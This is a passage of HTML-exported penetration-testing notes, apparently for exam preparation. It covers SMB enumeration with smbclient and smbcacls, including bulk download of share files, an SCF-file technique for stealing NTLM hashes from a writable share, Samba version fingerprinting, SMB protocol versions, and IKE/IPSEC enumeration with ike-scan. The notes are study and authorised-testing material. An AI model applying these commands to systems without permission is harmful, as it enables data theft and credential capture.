   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.2097in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-R</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>smbclient:</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4604in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List smb shares</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.6812in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>smbclient -L
   &lt;ip address&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4791in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Download all SMB
   files w/ smbclient</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.8076in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>smbclient //&lt;ip
         address&gt;/&lt;share name&gt;</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>recurse ON</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>prompt OFF</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>mget *</span></li>
    </ul>
   </ul>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4604in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Connect to share</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.6812in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>smbclient
   //&lt;ip address&gt;/&lt;share name&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4604in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show extended
   file attributes</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.6812in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>allinfo
   &lt;file&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4604in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Download data
   stream file</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.6812in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>get
   &quot;&lt;Parent File&gt;:&lt;Data Stream File&gt;&quot;</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>smbcacls</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6263in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>See folder
   permissions</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.5375in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>smbcacls -N
   '//&lt;ip&gt;/&lt;share&gt;' /&lt;folder&gt;</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>If access to write to SMB
      share</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>SCF File attack</span></li>
   <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Create icon on windows
        that has the icon set on remote ip.<span style='mso-spacerun:yes'>�
        </span>When Windows tries to pull that icon it authenticates to the
        remote server.<span style='mso-spacerun:yes'>  </span>Hash can t
hen be
        stolen.</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><a
        href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/"><span
        style='font-family:Calibri;font-size:11.0pt'>https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</span></a></li>
   </ul>
  </ul>
 </ul>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Enumerate samba version</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6895in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Wireshark</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.7729in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>Log in anonymously
         (smbclient -L </span><a href="file://%3cip"><span style='font-family:
         Calibri;font-size:11.0pt'>\\&lt;ip</span></a><span style='font-family:
         Calibri;font-size:11.0pt'> address&gt;</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>Search for packet with
         &quot;Session Setup Andx Responses&quot; in the info field</span></li>
    </ul>
   </ul>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.7868in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>raw.githubusercontent.com/rewardone/OSCPRepo/master/scripts/recon_enum/smbver.sh</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.6069in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Must change vpn
   interface in code</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6895in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ngrep &amp;
   smbclient</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.7041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>Terminal 1</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>ngrep -i -d tap0
          's.?a.?m.?b.?a.*[[:digit:]]' port 139</span></li>
     </ul>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>Terminal 2</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>echo exit | smbclient -L
          &lt;ip address&gt;</span></li>
     </ul>
    </ul>
   </ul>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Miscellaneous</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9284in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>NT_STATUS_CONNECTION_DISCONNECTED</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.8576in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Most likely smb
   is using too new of a protocol and needs to be manually set to use an older
   one<br>
      &nbsp;</p>
   <div style='direction:ltr'>
   <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:
    ltr;border-collapse:collapse;border-style:solid;border-color:#A3A3A3;
    border-width:1pt' title="" summary="">
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:1.7687in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Fix #1 -
     smbclient flag</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.05in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>smbclient
     //&lt;ip address&gt;/&lt;share name&gt; --option='client min protocol=NT1'</p>
     </td>
    </tr>
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:1.7881in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Fix #2 - Change
     config file</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.0305in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
      0in'>
      <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>Append to </span><span
           style='font-weight:bold;font-family:Calibri;font-size:11.0pt'>global
           </span><span style='font-family:Calibri;font-size:11.0pt'>section of
           /etc/samba/smb.conf:</span></li>
       <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
        margin-bottom:0in'>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>client min protocol =
            NT1</span></li>
        <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:
         0in;margin-bottom:0in'>
         <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
             style='font-family:Calibri;font-size:11.0pt'>Might need client min
             protocol = LANMAN1</span></li>
        </ul>
       </ul>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>service smbd restart</span></li>
      </ul>
     </ul>
     </td>
    </tr>
   </table>
   </div>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>SMB Protocols:</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>By default SMB2 selects the
       SMB2_10 variant.</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>By default SMB3 selects the
       SMB3_00 variant.</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.868in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>LANMAN1</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.1812in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>First modern
   version of the protocol. Long filename support.</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.868in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>LANMAN2</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.1812in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'> </span>Updates to Lanman1 protocol.</p
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.8486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>NT1</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.2006in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Current up to
   date version of the protocol. Used by Windows NT. Known as CIFS.</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.8486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SMB2</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.2701in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Re-implementation
   of the SMB protocol. Used by Windows Vista and later versions of Windows.
   SMB2 has sub protocols available.</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.8486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SMB2_02</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.2006in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>The earliest SMB2
   version.</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.8486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SMB2_10</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.2006in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Windows 7 SMB2
   version.</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.8486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SMB2_22</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.2006in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Early Windows 8
   SMB2 version.</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.8486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SMB2_24</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.2006in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Windows 8 beta
   SMB2 version.</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.8486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SMB3</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.2006in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>The same as SMB2.
   Used by Windows 8. SMB3 has sub protocols available.</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.8486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SMB3_00</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.2006in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Windows 8 SMB3
   version. (mostly the same as SMB2_24)</p>
   </td>
  </tr>
 </table>
 </div>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:4.7541in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.7618in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>464 TCP /
kpasswd5</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.2381in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
April 12, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>9:45
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1263in;width:4.6277in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Used for changing/setting
      passwords against Active Directory.</span></li>
 </ul>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.6201in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.5986in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>500 UDP /
ISAKMP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:1.9847in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Friday,
July 9, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>1:35
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1263in;width:7.4937in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Used for Internet Key
      Exchange (IKE)</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>nmap can only scan open TCP
      ports through IPSEC VPN using -sT (connect scan?)</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Used to establish an IPSEC
       VPN</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Internet Protocol Security
        (IPSEC) is a suite of tools that are used for securing network traffic
        at the IP Layer.</span></li>
    <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>AH and ESP protocols
         provide security assurances:</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Authentication Header
          (AH)</span></li>
      <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>Provides data integrity
           (We will now if the data has been modified between senders).</span></li>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>Data source
           authentication (We will know if the source isn't what is expected
           for that connection).</span></li>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>Protection against
           replay attacks.</span></li>
      </ul>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Encapsulating Security
          Payloads(ESP)</span></li>
      <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>Provides similar
           capabilities as AH plus confidentiality (Someone in the middle won't
           be able to see the data)</span></li>
      </ul>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Both of these protocols
          can operate in two modes:</span></li>
      <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>Transport mode</span></li>
       <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
        margin-bottom:0in'>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>The IP of the packet
            is sent in the clear over the internet for routing, but the payload
            is encrypted.</span></li>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>Typically used
            directly host to host</span></li>
       </ul>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>Tunnel mode</span></li>
       <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
        margin-bottom:0in'>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>The entire IP packet
            is encrypted and becomes the payload of another IP packet.<span
            style='mso-spacerun:yes'>  </span>The header of the new pack
et
            directs where the packet goes.</span></li>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>Typically used when a
            computer is behind a network.</span></li>
       </ul>
      </ul>
     </ul>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>There are also security
         associations (SA) used with IPSEC.<span style='mso-spacerun:yes'>�
         </span>This provides a bundle of algorithms to dynamically exchange
         keys and establish a secure connection over AH or ESP.<span
         style='mso-spacerun:yes'>  </span>IKE is one of those.</span></
li>
    </ul>
   </ul>
  </ul>
 </ul>
 <p style='margin:0in;margin-left:1.5in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Tools:</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>ike-scan</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>ike-scan -M &lt;ip
        address&gt;</span></li>
    <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>Enumerates:</span></li>
     <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
      margin-bottom:0in'>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>IKE Encryption type</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>Auth type (PSK, etc)</span></li>
      <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
          style='font-family:Calibri;font-size:11.0pt'>IKE version (v1 or v2)</span></li>
     </ul>
    </ul>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>strongswan</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Used to connect to VPN
        once password is known</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Avoid errors:</span></li>
    <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>sudo apt install
         libstrongswan-standard-plugins</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>sudo apt install
         libstrongswan-extra-plugins</span></li>
    </ul>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Must edit local files to
        connect to VPN</span></li>
    <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
